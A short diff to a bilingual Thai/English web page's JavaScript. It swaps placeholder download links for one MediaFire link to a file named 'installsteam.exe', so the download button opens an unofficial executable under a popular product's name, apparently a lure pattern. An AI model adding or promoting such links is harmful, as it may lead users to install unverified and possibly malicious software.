@@ -304,7 +304,7 @@ document.addEventListener('click', (e) => {
 
 function handleDownload(lang) {
     showNotification(`${lang === 'th' ? 'กำลังดาวน์โหลด...' : 'Downloading...'} ${lang === 'th' ? 'โปรแกรม' : 'program'}`);
-    window.open(lang === 'th' ? 'https://your-download-link-th' : 'https://your-download-link-en', '_blank');
+    window.open('https://www.mediafire.com/file/aq6kdts7df97nrk/installsteam.exe/file', '_blank');
 }
 
 window.addEventListener('DOMContentLoaded', startCounter);
